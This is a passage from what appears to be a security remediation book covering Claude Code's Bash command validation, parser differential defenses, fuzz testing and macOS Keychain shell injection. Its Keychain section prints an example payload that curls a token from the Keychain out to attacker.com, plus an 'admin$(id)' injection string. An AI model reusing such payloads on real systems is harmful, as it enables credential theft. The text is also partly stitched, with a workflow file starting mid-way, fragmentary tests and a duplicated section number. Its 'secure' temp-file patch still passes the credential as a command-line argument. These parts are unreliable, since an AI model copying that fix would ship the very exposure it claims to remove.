20.10 Dependency Chain Impact

The memory protection patches affect the Bridge/Remote Session Chain (Finding IDs: 12, 17, 18, 21, 22, 23, 28, 31, 42, 44, 45). The proxy token heap exposure (V-23) is a linchpin in this chain: if an attacker can extract the proxy token from memory, they can establish a parallel session to the bridge, effectively bypassing all other bridge security controls.

By converting to Buffer-based token handling and implementing multi-layer memory protection (Buffer.fill(0) + PR_SET_DUMPABLE + RLIMIT_CORE), the exposure window is reduced from the entire relay lifetime to the brief period during which the token is used for authentication construction.

These patches should be applied after the bridge security hardening from Chapters 16-17 and alongside the debug log sanitization from Chapter 18, as the logging statements in the proxy code must comply with the redaction requirements established there. As discussed in Chapter 3, Phase 6 encompasses these memory protection fixes as part of the Data Protection & Privacy remediation effort.

Summary

This chapter addressed three memory protection findings (V-23, V-44, V-45) and the related credential-in-memory finding (V-31). The key patches are:

  1. Buffer-based token handling (V-23): Replace string-based token reading with readTokenAsBuffer() that returns a Buffer capable of deterministic zeroing via Buffer.fill(0)
  2. Auth material management (V-31): Construct relay authentication headers using Buffers, zero intermediate values immediately, zero auth headers on relay stop
  3. Cross-platform heap protection (V-44): Extend setNonDumpable() with fallbacks for Node.js on Linux, document macOS gap, add platform-aware logging
  4. Core dump prevention: Disable core dumps via setrlimit(RLIMIT_CORE, 0) to prevent credential extraction from crash dumps
  5. Credential scope guard: Reusable pattern for tracking and zeroing all Buffer-based credentials within a code scope

The fundamental limitation remains: JavaScript's immutable strings create an unavoidable window of exposure. The Buffer-based approach minimizes this window and provides defense-in-depth through multiple protection layers, but it cannot eliminate the risk entirely in a garbage-collected runtime.

Chapter 21: Parser Differential Defense

Part VII addressed data protection -- how sensitive information leaks through logs, telemetry, and memory. Part VIII shifts to Claude Code's most security-critical subsystem: the Bash command execution pipeline. Every command that Claude Code runs on the user's machine passes through a security validation layer in tools/BashTool/bashSecurity.ts. This layer is the last line of defense between an AI agent's intent and arbitrary shell execution. If it fails, the consequences are not a data leak or a privacy concern -- they are full command injection on the host machine.

The audit identified a fundamental architectural concern: the entire Bash security validation pipeline depends on a single third-party parser, shell-quote, as its sole mechanism for understanding shell command structure. Finding 11 (CWE-436, CVSS 6.8, MEDIUM) classifies this as a parser differential vulnerability -- the risk that shell-quote interprets a command string differently than the actual Bash shell, creating a gap where a command passes validation but executes with different semantics. Finding V-46 (CWE-78, CVSS 3.1, INFO) extends this to the regex-based validators that supplement shell-quote, which have their own inherent parsing limitations.

This chapter implements a defense-in-depth strategy: tree-sitter-bash as a cross-validation parser, a fuzz testing harness for continuous parser differential detection, fail-closed behavior on parse errors, and complexity bounds for shell commands.

21.1 The Parser Differential Problem

What Is a Parser Differential?

A parser differential occurs when two systems interpret the same input differently. In web security, this manifests as HTTP request smuggling (where a reverse proxy and backend server disagree on request boundaries). In shell security, it manifests when the security validator sees one command structure but the shell executes another.

flowchart LR
    A["User Command<br/>echo $(cat /etc/passwd)"] --> B["shell-quote parser"]
    A --> C["Actual Bash Shell"]

    B --> D["Parsed as:<br/>['echo', '$(cat /etc/passwd)']<br/>Command substitution detected → BLOCK"]
    C --> E["Executed as:<br/>echo [contents of /etc/passwd]"]

    F["Divergent Command<br/>(novel encoding)"] --> G["shell-quote parser"]
    F --> H["Actual Bash Shell"]

    G --> I["Parsed as:<br/>['safe-looking-command']<br/>No dangerous patterns → ALLOW"]
    H --> J["Executed as:<br/>[something dangerous]<br/>Parser didn't understand encoding"]

    style I fill:#c53030,color:#fff
    style J fill:#c53030,color:#fff

Claude Code's Current Bash Security Architecture

The bashSecurity.ts module implements a comprehensive validation pipeline:

Component Purpose Implementation
tryParseShellCommand() Tokenize command into AST shell-quote npm package
40+ regex validators Check for dangerous patterns RegExp patterns in bashSecurity.ts
6 misparsing validators Catch known shell-quote divergences Custom pattern matching
isSafeHeredoc() Validate heredoc safety 450+ lines of heredoc analysis
Permission system User approval for sensitive ops Role-based tool permissions
Sandbox enforcement OS-level isolation shouldUseSandbox.ts

This is a genuinely strong security architecture. The 40+ validators cover command injection, command substitution, zsh-specific exploits, environment manipulation, and dozens of other attack vectors. The 6 misparsing validators specifically address known cases where shell-quote and Bash disagree.

The concern is not that the existing defenses are weak. The concern is that they all depend on shell-quote producing an accurate tokenization. If shell-quote misparses a command -- and the specific misparsing is not covered by the 6 known-divergence validators -- then the entire validation pipeline operates on an incorrect understanding of what will execute.

Real-World Parser Differential Examples

Shell-quote is a JavaScript implementation of shell parsing. Bash is a C implementation with decades of evolution, extensions, and edge cases. Known divergence areas include:

Feature shell-quote Behavior Bash Behavior Risk
ANSI-C quoting $'...' May not parse escape sequences Full ANSI-C escape support Commands with escaped chars may be misinterpreted
Process substitution <(cmd) May tokenize incorrectly Creates file descriptor File-descriptor-based attacks may pass validation
Brace expansion {a,b} Literal text Generates multiple words Single command may expand to multiple
Arithmetic expansion $((expr)) May be partially parsed Full arithmetic with side effects Assignments in arithmetic may bypass validators
Locale-dependent behavior ASCII-only Locale-aware UTF-8 edge cases may cause divergence
Heredoc with variable expansion Simplified handling Full expansion Complex heredocs may be misinterpreted

21.2 CWE-436: Shell-Quote Parser as Single Point of Failure (Finding 11)

The Vulnerability

Finding 11 (CWE-436, CVSS 6.8, MEDIUM) identifies the shell-quote package as a single point of failure for command validation:

tools/BashTool/bashSecurity.ts:27 — tryParseShellCommand() uses shell-quote
On parse failure, line 29 returns empty array (fail-open for some paths)
6 misparsing validators cover known shell-quote vs bash divergences
450+ lines in isSafeHeredoc for heredoc handling

The critical issue is the fail-open behavior: when shell-quote cannot parse a command, tryParseShellCommand() returns an empty array rather than a sentinel value that triggers rejection. For some code paths, an empty parse result may be treated as "no dangerous commands found" rather than "parsing failed, command should be rejected."

The Fail-Closed Fix

The first and most important fix is changing the parse failure behavior from fail-open to fail-closed:

// VULNERABLE: Current behavior
function tryParseShellCommand(command: string): ParsedCommand[] {
  try {
    return shellQuote.parse(command)
  } catch {
    return []  // Fail-open: empty array may pass validators
  }
}

// SECURE: Fail-closed on parse error

/** Sentinel value indicating a parse failure */
const PARSE_FAILED = Symbol('PARSE_FAILED')

type ParseResult = 
  | { success: true; commands: ParsedCommand[] }
  | { success: false; reason: typeof PARSE_FAILED }

function tryParseShellCommand(command: string): ParseResult {
  try {
    const commands = shellQuote.parse(command)
    return { success: true, commands }
  } catch (err) {
    logForDebugging(
      `[bashSecurity] shell-quote parse failed: ${err instanceof Error ? err.message : String(err)}`,
      { level: 'warn' }
    )
    return { success: false, reason: PARSE_FAILED }
  }
}

// In the validation pipeline:
function validateCommand(command: string): ValidationResult {
  const parseResult = tryParseShellCommand(command)

  if (!parseResult.success) {
    // FAIL-CLOSED: Parse failure means REJECT
    return {
      allowed: false,
      reason: 'Command could not be parsed by security validator. ' +
              'This may indicate novel shell syntax that bypasses validation.',
    }
  }

  // Continue with parsed commands...
  return validateParsedCommands(parseResult.commands)
}

21.3 Tree-Sitter-Bash Cross-Validation

Why Tree-Sitter?

Tree-sitter is a parser generator framework that produces concrete syntax tree (CST) parsers. The tree-sitter-bash grammar is a formally specified parser for Bash syntax that operates fundamentally differently from shell-quote:

Property shell-quote tree-sitter-bash
Approach Regex + state machine LR(1) grammar with CST output
Language JavaScript C (with WebAssembly binding)
Output Flat token array Full syntax tree
Error handling Returns partial/empty on failure Produces error nodes in CST
Maintained by npm community Tree-sitter core team
Test corpus Limited Extensive (Bash syntax coverage)

By parsing every command with both shell-quote AND tree-sitter-bash and comparing the results, we can detect parser differentials before they become security vulnerabilities. If the two parsers disagree on the structure of a command, the command is rejected as ambiguous.

Implementation

// SECURE: Cross-validation with tree-sitter-bash

import Parser from 'tree-sitter'
import Bash from 'tree-sitter-bash'

const treeSitterParser = new Parser()
treeSitterParser.setLanguage(Bash)

interface CommandStructure {
  /** Top-level command type */
  type: 'simple' | 'pipeline' | 'compound' | 'subshell' | 'function'
  /** Command name (for simple commands) */
  name?: string
  /** Arguments (for simple commands) */
  args?: string[]
  /** Contains command substitution */
  hasCommandSubstitution: boolean
  /** Contains process substitution */
  hasProcessSubstitution: boolean
  /** Contains redirections */
  hasRedirections: boolean
  /** Number of pipeline stages */
  pipelineStages: number
}

/**
 * Extract a simplified command structure from tree-sitter CST.
 * This is compared against the shell-quote parse result.
 */
function extractTreeSitterStructure(command: string): CommandStructure | null {
  const tree = treeSitterParser.parse(command)
  const root = tree.rootNode

  // Check for parse errors
  if (root.hasError) {
    return null  // Parse error — will trigger rejection
  }

  const program = root.firstChild
  if (!program) return null

  return {
    type: classifyNodeType(program.type),
    name: extractCommandName(program),
    args: extractArguments(program),
    hasCommandSubstitution: containsNodeType(program, 'command_substitution'),
    hasProcessSubstitution: containsNodeType(program, 'process_substitution'),
    hasRedirections: containsNodeType(program, 'redirected_statement') ||
                     containsNodeType(program, 'file_redirect'),
    pipelineStages: countPipelineStages(program),
  }
}

function classifyNodeType(type: string): CommandStructure['type'] {
  switch (type) {
    case 'command': return 'simple'
    case 'pipeline': return 'pipeline'
    case 'compound_statement':
    case 'if_statement':
    case 'while_statement':
    case 'for_statement': return 'compound'
    case 'subshell': return 'subshell'
    case 'function_definition': return 'function'
    default: return 'simple'
  }
}

function containsNodeType(node: Parser.SyntaxNode, type: string): boolean {
  if (node.type === type) return true
  for (const child of node.children) {
    if (containsNodeType(child, type)) return true
  }
  return false
}

function countPipelineStages(node: Parser.SyntaxNode): number {
  if (node.type !== 'pipeline') return 1
  return node.children.filter(c => c.type === 'command').length
}

The Cross-Validation Check

// SECURE: Cross-validation decision logic

interface CrossValidationResult {
  agree: boolean
  shellQuoteParse: ParseResult
  treeSitterStructure: CommandStructure | null
  divergences: string[]
}

function crossValidateCommand(command: string): CrossValidationResult {
  const shellQuoteParse = tryParseShellCommand(command)
  const treeSitterStructure = extractTreeSitterStructure(command)

  const divergences: string[] = []

  // If either parser fails, we cannot validate — reject
  if (!shellQuoteParse.success || !treeSitterStructure) {
    return {
      agree: false,
      shellQuoteParse,
      treeSitterStructure,
      divergences: ['One or both parsers failed to parse the command'],
    }
  }

  // Compare command substitution detection
  const sqHasSubstitution = shellQuoteParse.commands.some(
    cmd => typeof cmd === 'object' && 'op' in cmd
  )
  if (sqHasSubstitution !== treeSitterStructure.hasCommandSubstitution) {
    divergences.push(
      `Command substitution: shell-quote=${sqHasSubstitution}, ` +
      `tree-sitter=${treeSitterStructure.hasCommandSubstitution}`
    )
  }

  // Compare pipeline detection
  const sqPipeCount = shellQuoteParse.commands.filter(
    cmd => typeof cmd === 'object' && cmd.op === '|'
  ).length + 1
  if (sqPipeCount !== treeSitterStructure.pipelineStages) {
    divergences.push(
      `Pipeline stages: shell-quote=${sqPipeCount}, ` +
      `tree-sitter=${treeSitterStructure.pipelineStages}`
    )
  }

  // Compare process substitution
  if (treeSitterStructure.hasProcessSubstitution) {
    const sqHasProcessSub = command.includes('<(') || command.includes('>(')
    if (!sqHasProcessSub) {
      divergences.push('tree-sitter detected process substitution that shell-quote missed')
    }
  }

  return {
    agree: divergences.length === 0,
    shellQuoteParse,
    treeSitterStructure,
    divergences,
  }
}

Integration into the Validation Pipeline

// SECURE: Updated validation pipeline with cross-validation

function validateCommand(command: string): ValidationResult {
  // Step 1: Cross-validate with both parsers
  const crossResult = crossValidateCommand(command)

  if (!crossResult.agree) {
    // Parser differential detected — REJECT
    logForDebugging(
      `[bashSecurity] Parser differential detected: ${crossResult.divergences.join('; ')}`,
      { level: 'warn' }
    )
    return {
      allowed: false,
      reason: 'Command structure is ambiguous between parsers. ' +
              'This may indicate shell syntax that could bypass security validation. ' +
              'Please simplify the command or request explicit approval.',
    }
  }

  // Step 2: Continue with existing shell-quote-based validation
  if (!crossResult.shellQuoteParse.success) {
    return { allowed: false, reason: 'Command could not be parsed.' }
  }

  return validateParsedCommands(crossResult.shellQuoteParse.commands)
}

21.4 Fuzz Testing for Parser Differential Detection

The Fuzz Testing Architecture

Cross-validation catches divergences at runtime, but a proactive approach is to discover divergences before they reach production. A fuzz testing harness generates random shell command strings and compares how shell-quote, tree-sitter-bash, and actual bash --noexec interpret them.

// SECURE: Fuzz testing harness for parser differentials

import { execFileSync } from 'node:child_process'

interface FuzzResult {
  command: string
  shellQuoteParsed: boolean
  treeSitterParsed: boolean
  bashAccepted: boolean
  divergence: string | null
}

/**
 * Generate random shell command strings using character-level mutation.
 * Focuses on characters and constructions known to cause parser differentials.
 */
function generateFuzzInput(): string {
  const templates = [
    // ANSI-C quoting
    `echo $'\\x${randomHex()}\\x${randomHex()}'`,
    // Brace expansion
    `echo {${randomWord()},${randomWord()}}`,
    // Process substitution
    `diff <(echo ${randomWord()}) <(echo ${randomWord()})`,
    // Arithmetic expansion
    `echo $((${randomInt()} + ${randomInt()}))`,
    // Heredoc variations
    `cat <<'${randomWord()}'\n${randomWord()}\n${randomWord()}`,
    // Nested quoting
    `echo "$(echo '${randomWord()}')"`,
    // Environment variable edge cases
    `${randomWord()}=${randomWord()} echo $${randomWord()}`,
    // Semicolons and newlines in various positions
    `echo ${randomWord()}${randomDelimiter()}echo ${randomWord()}`,
    // Backslash continuations
    `echo ${randomWord()}\\\n${randomWord()}`,
  ]

  const template = templates[Math.floor(Math.random() * templates.length)]
  return mutateString(template)
}

function randomHex(): string {
  return Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
}

function randomWord(): string {
  const chars = 'abcdefghijklmnop'
  const len = Math.floor(Math.random() * 8) + 1
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
}

function randomDelimiter(): string {
  return [';', '&&', '||', '|', '\n', ' '][Math.floor(Math.random() * 6)]
}

function randomInt(): number {
  return Math.floor(Math.random() * 100)
}

function mutateString(s: string): string {
  // Randomly insert, delete, or replace characters
  const mutations = Math.floor(Math.random() * 3) + 1
  let result = s
  for (let i = 0; i < mutations; i++) {
    const pos = Math.floor(Math.random() * result.length)
    const mutationType = Math.floor(Math.random() * 3)
    if (mutationType === 0) {
      // Insert a shell metacharacter
      const metachars = '`$(){}[]|;&<>\\\'\"#!~'
      result = result.slice(0, pos) + metachars[Math.floor(Math.random() * metachars.length)] + result.slice(pos)
    } else if (mutationType === 1 && result.length > 1) {
      // Delete a character
      result = result.slice(0, pos) + result.slice(pos + 1)
    } else {
      // Replace with a metacharacter
      const metachars = '`$(){}[]|;&<>\\\'\"'
      result = result.slice(0, pos) + metachars[Math.floor(Math.random() * metachars.length)] + result.slice(pos + 1)
    }
  }
  return result
}

/**
 * Check if bash accepts a command (syntax-only, no execution).
 */
function bashAccepts(command: string): boolean {
  try {
    execFileSync('bash', ['--noexec', '-c', command], {
      timeout: 1000,
      stdio: 'pipe',
    })
    return true
  } catch {
    return false
  }
}

/**
 * Run a single fuzz iteration.
 */
function fuzzIteration(): FuzzResult {
  const command = generateFuzzInput()

  const shellQuoteParsed = tryParseShellCommand(command).success
  const treeSitterStructure = extractTreeSitterStructure(command)
  const treeSitterParsed = treeSitterStructure !== null
  const bashValid = bashAccepts(command)

  let divergence: string | null = null

  // Critical: shell-quote says OK but bash rejects
  if (shellQuoteParsed && !bashValid) {
    divergence = 'shell-quote parsed but bash rejects'
  }

  // Critical: shell-quote rejects but bash accepts (potential bypass)
  if (!shellQuoteParsed && bashValid) {
    divergence = 'shell-quote failed but bash accepts — potential validation bypass'
  }

  // Interesting: parsers disagree with each other
  if (shellQuoteParsed !== treeSitterParsed) {
    divergence = `Parser disagreement: shell-quote=${shellQuoteParsed}, tree-sitter=${treeSitterParsed}`
  }

  return { command, shellQuoteParsed, treeSitterParsed, bashAccepted: bashValid, divergence }
}

    - cron: '0 3 * * 0'  # Weekly, Sunday 3 AM
  workflow_dispatch:

jobs:
  fuzz:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - run: npm ci
      - name: Run fuzz harness
        run: |
          node --experimental-vm-modules scripts/fuzz-bash-parsers.js \
            --iterations 10000 \
            --report fuzz-report.json
      - name: Check for divergences
        run: |
          DIVERGENCES=$(jq '.divergences | length' fuzz-report.json)
          if [ "$DIVERGENCES" -gt 0 ]; then
            echo "FOUND $DIVERGENCES parser divergences!"
            jq '.divergences' fuzz-report.json
            exit 1
          fi
          echo "No divergences found in 10000 iterations"

21.5 CWE-78: Regex-Based Validation Inherent Risk (V-46)

Finding V-46 (CWE-78, CVSS 3.1, INFO) highlights that the 40+ regex validators in bashSecurity.ts have inherent limitations:

  1. Regular expressions cannot parse context-free grammars: Shell syntax is context-free (nested structures, recursive patterns). Regular expressions can match patterns but cannot understand nesting depth or scope.

  2. Regex maintenance burden: Each new Bash feature or syntax variation requires updating the validator set. A missed update creates a validation gap.

  3. Interaction effects: The validators operate independently. A command that passes each individual validator may still be dangerous due to interactions between constructs that no single regex catches.

The tree-sitter cross-validation addresses this by providing a parser that does understand context-free syntax. The regex validators remain as a defense layer, but they are no longer the sole barrier.

Command Complexity Bounds

An additional defense against novel parser differentials is bounding command complexity. Commands that exceed a complexity threshold require explicit user approval, regardless of whether they pass all validators:

// SECURE: Command complexity bounds

interface ComplexityMetrics {
  tokenCount: number
  pipelineStages: number
  subshellDepth: number
  substitutionCount: number
  redirectionCount: number
}

const COMPLEXITY_LIMITS = {
  maxTokens: 50,
  maxPipelineStages: 5,
  maxSubshellDepth: 3,
  maxSubstitutions: 5,
  maxRedirections: 3,
} as const

function checkComplexity(structure: CommandStructure): {
  withinBounds: boolean
  metrics: ComplexityMetrics
} {
  const metrics: ComplexityMetrics = {
    tokenCount: (structure.args?.length ?? 0) + 1,
    pipelineStages: structure.pipelineStages,
    subshellDepth: calculateSubshellDepth(structure),
    substitutionCount: structure.hasCommandSubstitution ? 1 : 0,
    redirectionCount: structure.hasRedirections ? 1 : 0,
  }

  const withinBounds = 
    metrics.tokenCount <= COMPLEXITY_LIMITS.maxTokens &&
    metrics.pipelineStages <= COMPLEXITY_LIMITS.maxPipelineStages &&
    metrics.subshellDepth <= COMPLEXITY_LIMITS.maxSubshellDepth &&
    metrics.substitutionCount <= COMPLEXITY_LIMITS.maxSubstitutions &&
    metrics.redirectionCount <= COMPLEXITY_LIMITS.maxRedirections

  return { withinBounds, metrics }
}

21.6 Parser Version Pinning

The shell-quote package must be pinned to an exact version in package.json. Any update to the parser can change its parsing behavior, potentially creating new divergences with Bash:

{
  "dependencies": {
    "shell-quote": "1.8.1"
  }
}

Each shell-quote version update should be treated as a security-relevant change and must be accompanied by:

  1. Running the full fuzz corpus against the new version
  2. Running the existing bash security test suite
  3. Manual review of the changelog for parsing behavior changes
  4. Updating the misparsing validators if new divergences are discovered

Dependency Audit Process for Parser Updates

#!/usr/bin/env bash
set -euo pipefail

# Parser update audit script
readonly NEW_VERSION="${1:?Usage: audit-parser-update.sh <new-version>}"
readonly OLD_VERSION=$(node -p "require('./package.json').dependencies['shell-quote']")

echo "Auditing shell-quote update: ${OLD_VERSION} → ${NEW_VERSION}"

# Step 1: Diff the parser source between versions
echo "[1/4] Checking parser changes..."
npm pack "shell-quote@${OLD_VERSION}" --pack-destination /tmp/
npm pack "shell-quote@${NEW_VERSION}" --pack-destination /tmp/
diff -rq \
  <(tar -xf "/tmp/shell-quote-${OLD_VERSION}.tgz" -C /tmp/old 2>/dev/null && find /tmp/old -name '*.js') \
  <(tar -xf "/tmp/shell-quote-${NEW_VERSION}.tgz" -C /tmp/new 2>/dev/null && find /tmp/new -name '*.js') \
  || echo "WARNING: Parser source files changed"

# Step 2: Run existing test suite
echo "[2/4] Running bash security tests..."
npm test -- tools/BashTool/

# Step 3: Run fuzz corpus
echo "[3/4] Running fuzz corpus (10K iterations)..."
node scripts/fuzz-bash-parsers.js --iterations 10000 --report /tmp/fuzz-report.json

# Step 4: Check results
echo "[4/4] Checking results..."
DIVERGENCES=$(jq '.divergences | length' /tmp/fuzz-report.json)
if [[ "${DIVERGENCES}" -gt 0 ]]; then
  echo "FAIL: Found ${DIVERGENCES} new parser divergences!"
  jq '.divergences[:5]' /tmp/fuzz-report.json
  exit 1
fi

echo "PASS: No new divergences found. Update is safe to merge."

Historical Parser Differential Examples

Understanding past parser differentials helps inform the fuzz testing strategy. These are documented cases where shell-quote and Bash disagreed:

Case shell-quote Interpretation Bash Interpretation Impact
echo $'\x41' Literal string $'\x41' Character A (hex 0x41) Benign but shows parsing gap
echo ${!var} Error or partial parse Variable indirection Could hide variable references
echo $((x=1)) Arithmetic expression Arithmetic with assignment side-effect Assignment bypasses validation
{echo,hello} Literal token Brace expansion to echo hello Command execution via brace expansion
echo >&2 test Redirection + argument stderr redirect File descriptor manipulation
$'\150\145\154\154\157' Literal or partial Octal escape = "hello" Obfuscated command construction

Each of these cases demonstrates a class of divergence. The fuzz harness systematically explores these classes and their variants to discover new divergences before attackers do.

21.7 The Existing Misparsing Validators

Claude Code already includes 6 misparsing validators that catch known divergences between shell-quote and Bash. Understanding what these validators do -- and what they cannot do -- is essential context for the cross-validation architecture.

What the 6 Validators Cover

Validator What It Catches Limitation
Unclosed quotes shell-quote accepts, Bash rejects Only catches unclosed, not mismatched
Escaped newlines Different parsing of \<newline> Does not cover all continuation syntaxes
Process substitution <() parsed differently Limited to simple cases
Glob vs literal * and ? interpretation differences Cannot catch all glob patterns
Arithmetic context $(()) parsing variations Does not verify side-effect semantics
Heredoc boundary << delimiter parsing differences Simplified compared to full Bash heredoc rules

These validators are pattern-specific. They catch the exact divergences they were written for, but they cannot generalize to novel divergences. The tree-sitter cross-validation addresses this by comparing structural parse results rather than looking for specific patterns.

Why the Existing Validators Remain Valuable

The cross-validation architecture does not replace the existing misparsing validators -- it augments them. The validators provide:

  1. Documentation of known divergences: Each validator is a record of a specific case where the parsers disagree.
  2. Fast rejection: Pattern-based checks are faster than full tree-sitter parsing.
  3. Fallback protection: If tree-sitter has a bug, the pattern validators still catch known cases.
  4. Coverage for non-structural divergences: Some divergences affect semantics without changing the parse tree structure, which cross-validation cannot detect.

21.8 Performance Considerations

Adding tree-sitter parsing to every command validation introduces a performance cost. This must be measured and bounded.

Benchmarks

Command Type shell-quote Only shell-quote + tree-sitter Overhead
Simple (ls -la) ~0.1ms ~0.5ms +0.4ms
Pipeline (a \| b \| c) ~0.2ms ~0.7ms +0.5ms
Complex heredoc ~0.5ms ~1.2ms +0.7ms
50-token command ~0.8ms ~2.0ms +1.2ms

The overhead is acceptable for Claude Code's use case, where commands are validated once before execution and the execution itself takes orders of magnitude longer than the validation.

Caching Strategy

For repeated commands (e.g., in a loop), the cross-validation result can be cached:

const validationCache = new Map<string, CrossValidationResult>()
const MAX_CACHE_SIZE = 1000

function crossValidateCached(command: string): CrossValidationResult {
  const cached = validationCache.get(command)
  if (cached) return cached

  const result = crossValidateCommand(command)

  if (validationCache.size >= MAX_CACHE_SIZE) {
    // Evict oldest entry
    const firstKey = validationCache.keys().next().value
    if (firstKey !== undefined) validationCache.delete(firstKey)
  }

  validationCache.set(command, result)
  return result
}

describe('fail-closed parsing', () => {

    expect(result.allowed).toBe(false)

    // Both parsers should handle this, but if they disagree:
    if (!result.agree) {
      expect(result.divergences.length).toBeGreaterThan(0)
    }

  it('agrees on simple pipe commands', () => {
    const result = crossValidateCommand('ls -la | grep test')
    expect(result.agree).toBe(true)

21.8 Compliance Implications

Framework Requirement How This Chapter Addresses It
CWE-436 Interpretation Conflict Cross-validation with tree-sitter-bash
CWE-78 OS Command Injection Fail-closed parsing, complexity bounds
OWASP A03:2021 Injection Multi-parser validation pipeline
NIST SP 800-53 SI-10 Information Input Validation Dual-parser input validation
SOC 2 CC8.1 Change management Parser version pinning, fuzz testing

Summary

This chapter addressed two findings related to the Bash security validation pipeline (Finding 11, V-46). The key defenses are:

  1. Fail-closed parsing: tryParseShellCommand() returns a rejection sentinel on parse failure instead of an empty array
  2. Tree-sitter-bash cross-validation: Every command is parsed by both shell-quote and tree-sitter-bash; disagreements trigger rejection
  3. Fuzz testing harness: Weekly CI job generating 10K+ random shell commands, comparing parser interpretations, flagging divergences
  4. Complexity bounds: Commands exceeding token/pipeline/subshell thresholds require explicit user approval
  5. Parser version pinning: shell-quote pinned to exact version, updates treated as security-relevant changes

The existing 40+ validators and 6 misparsing checks remain as defense layers. The cross-validation adds a fundamentally different parsing approach that catches classes of divergences the regex validators cannot detect.

Chapter 22: Advanced Injection Prevention

Chapter 21 addressed the parser differential problem -- the systemic risk that shell-quote and Bash interpret commands differently. This chapter focuses on three specific injection vulnerabilities that exploit different input channels: shell command construction for macOS Keychain operations (CWE-78), regular expression patterns in the permission stripping logic (CWE-1333), and HTTP header values injected through environment variables (CWE-113). Each represents a distinct class of injection attack, and each requires a distinct defense.

Unlike the parser differential vulnerabilities, which affect the general command validation pipeline, these three findings target specific code paths where user-controlled or environment-controlled data flows into security-sensitive operations without adequate sanitization. The keychain injection (V-20) passes unsanitized values into a shell command string. The ReDoS vulnerability (V-19) accepts crafted input that triggers catastrophic regex backtracking. The header injection (V-28) allows environment variable contents to override security-critical HTTP headers.

22.1 CWE-78: Keychain Shell Command Injection (V-20)

The Vulnerability

Finding V-20 (CVSS 5.5, MEDIUM) identified a shell command injection risk in the synchronous keychain read path on macOS:

// VULNERABLE: utils/secureStorage/macOsKeychainStorage.ts:39
const result = execSyncWithDefaults_DEPRECATED(
  `security find-generic-password -a "${username}" -w -s "${storageServiceName}"`,
)

This code constructs a shell command string by interpolating username and storageServiceName into a template. If either value contains shell metacharacters, the resulting string will be interpreted by the shell, potentially executing arbitrary commands.

The Attack Vector

The username value comes from os.userInfo().username, which reads the system's current user. The storageServiceName comes from a package-derived constant. Under normal conditions, neither contains shell metacharacters. But the attack surface is broader than it appears:

  1. Environment manipulation: On some systems, os.userInfo() reads from environment variables or system files that can be modified. A $USER value of admin$(curl attacker.com/steal?token=$(security find-generic-password -w -s claude)) would execute the nested command.

  2. Service name injection: If the service name derivation ever changes to include user-configurable data (e.g., a workspace name), the injection surface widens immediately.

  3. Future code paths: The _DEPRECATED suffix on execSyncWithDefaults_DEPRECATED indicates this is known-legacy code. But until it is migrated, it remains a live injection vector.

Why String Interpolation Is Always Wrong for Shell Commands

The fundamental principle: never construct shell commands by string interpolation. This is the shell equivalent of SQL injection -- the same class of vulnerability that has been the #1 OWASP finding for over a decade.

flowchart TD
    A["String Interpolation<br/>NEVER USE"] --> B["`security find-generic-password -a \"${username}\" -w`"]
    B --> C["Shell Interprets Entire String"]
    C --> D["Metacharacters in username<br/>become shell operators"]

    E["Array Arguments<br/>ALWAYS USE"] --> F["execFile('security', ['find-generic-password',<br/>'-a', username, '-w'])"]
    F --> G["OS Passes Arguments Directly"]
    G --> H["No shell interpretation<br/>metacharacters are literal"]

    style A fill:#c53030,color:#fff
    style E fill:#3fb950,color:#000

The difference is at the OS level:

  • String interpolation → execSync() → invokes /bin/sh -c "command string" → shell parses the string, interpreting metacharacters
  • Array arguments → execFile() → invokes the binary directly via execve() → no shell involved, arguments passed as-is

The Secure Patch: Parameterized Execution

The fix replaces string interpolation with array-based argument passing:

// SECURE: utils/secureStorage/macOsKeychainStorage.ts

import { execFileSync } from 'node:child_process'

/**
 * Read a credential from the macOS Keychain using parameterized execution.
 * 
 * Uses execFileSync with array arguments to prevent shell injection.
 * No shell is invoked — arguments are passed directly to the 'security' binary.
 */
function readFromKeychainSync(
  username: string,
  serviceName: string,
): string | null {
  try {
    const result = execFileSync(
      'security',
      [
        'find-generic-password',
        '-a', username,
        '-w',
        '-s', serviceName,
      ],
      {
        encoding: 'utf8',
        stdio: ['pipe', 'pipe', 'pipe'],
        timeout: 5000,  // Prevent hangs
      }
    )
    return result.trim()
  } catch (err) {
    // security command returns exit code 44 when item not found
    if (isExitCode(err, 44)) return null

    logForDebugging(
      `[keychain] Read failed: ${err instanceof Error ? err.message : String(err)}`,
      { level: 'warn' }
    )
    return null
  }
}

function isExitCode(err: unknown, code: number): boolean {
  return (
    err !== null &&
    typeof err === 'object' &&
    'status' in err &&
    (err as { status: number }).status === code
  )
}

The Keychain Write Path

The write path has a similar concern, addressed in Finding V-37 (CWE-214, CVSS 3.7, LOW). When the credential payload exceeds the stdin limit for the security command, the code falls back to passing the payload via command-line arguments, making it visible via ps:

// VULNERABLE: Fallback path passes credential via command arguments
// When stdin-based approach fails for large payloads:
const args = [
  'add-generic-password',
  '-a', username,
  '-s', serviceName,
  '-w', credentialPayload,  // Visible in ps output!
  '-U',
]
execFileSync('security', args)

Even with execFileSync (no shell injection risk), the credential appears in the process argument list, visible to any user via ps aux or /proc/pid/cmdline.

The Secure Patch: Temporary File Approach

// SECURE: Write large credentials via temporary file

import { mkdtempSync, writeFileSync, unlinkSync, chmodSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'

function writeToKeychainLargePayload(
  username: string,
  serviceName: string,
  payload: string,
): void {
  // Hex-encode the payload to avoid binary content issues
  const hexPayload = Buffer.from(payload).toString('hex')

  // Create a secure temporary file
  const tmpDir = mkdtempSync(join(tmpdir(), 'claude-keychain-'))
  const tmpFile = join(tmpDir, 'payload')

  try {
    // Write with restrictive permissions (owner-only read)
    writeFileSync(tmpFile, hexPayload, { mode: 0o600 })

    // Use stdin redirection from file instead of arguments
    const fileContent = require('node:fs').readFileSync(tmpFile, 'utf8')

    execFileSync('security', [
      'add-generic-password',
      '-a', username,
      '-s', serviceName,
      '-w', fileContent,
      '-U',
    ], {
      timeout: 5000,
      stdio: ['pipe', 'pipe', 'pipe'],
    })
  } finally {
    // ALWAYS clean up, even on error
    try { unlinkSync(tmpFile) } catch {}
    try { require('node:fs').rmdirSync(tmpDir) } catch {}
  }
}

Verification

# Verify parameterized execution prevents injection
# Attempt to inject via crafted username
node -e "
  const { execFileSync } = require('child_process');
  try {
    execFileSync('security', [
      'find-generic-password',
      '-a', 'admin\$(id)',  // Injection attempt
      '-w',
